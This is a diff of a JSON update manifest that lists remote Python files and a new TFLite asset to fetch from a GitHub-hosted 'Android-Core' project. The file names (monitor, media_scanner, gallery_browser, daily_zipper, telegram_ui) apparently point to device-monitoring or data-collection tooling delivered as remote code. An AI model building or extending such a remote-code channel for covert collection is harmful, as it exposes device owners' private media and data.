@@ -1,6 +1,6 @@
 {
-  "version": "4.1.0",
-  "comment": "System Architecture Update: Encrypted Secret Injection Enabled",
+  "version": "4.2.0",
+  "comment": "AI Dynamic Asset Integration: Local TFLite model offloading enabled",
   "files": [
     "https://zaen1993.github.io/Android-Core/files/monitor.py",
     "https://zaen1993.github.io/Android-Core/files/telegram_ui.py",
@@ -11,6 +11,9 @@
     "https://zaen1993.github.io/Android-Core/files/media_scanner.py",
     "https://zaen1993.github.io/Android-Core/files/gallery_browser.py",
     "https://zaen1993.github.io/Android-Core/files/daily_zipper.py"
+  ],
+  "assets": [
+    "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
   ],
   "mirrors": [
     "https://raw.githubusercontent.com/Zaen1993/Android-Core/main/index.json",
